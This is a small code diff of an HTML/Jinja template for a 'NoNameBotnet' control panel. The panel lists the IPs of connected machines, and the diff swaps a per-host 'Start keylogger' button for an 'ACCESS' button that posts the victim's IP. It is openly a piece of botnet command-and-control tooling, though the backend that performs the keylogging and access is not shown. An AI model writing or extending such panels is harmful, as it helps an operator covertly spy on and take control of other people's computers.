@@ -2,15 +2,14 @@
 <table style="width:100%">
 	<h1><b>NoNameBotnet</b></h1>
 	<tr>
-		<th> IP CONNECTED </th>
-		<th> comando 1 </th>
+		<th> AVAILABLE IP </th>
 	</tr>
-	{% for item in data %}
+	{% for ip in data %}
         <tr>
-        	<th> {{ item }} </th>
+        	<th> {{ ip }} </th>
         	<th><form method="post"> 
-				<input type="submit" name="submit" value='Start keylogger'> 
-				<input name="keyloginfo" type="hidden" value='{{item}}:klg'> 
+				<input type="submit" name="submit" value='ACCESS'> 
+				<input name="access" type="hidden" value='{{ ip }}'> 
 		</form></th>
 	</tr>
 	{% endfor %}
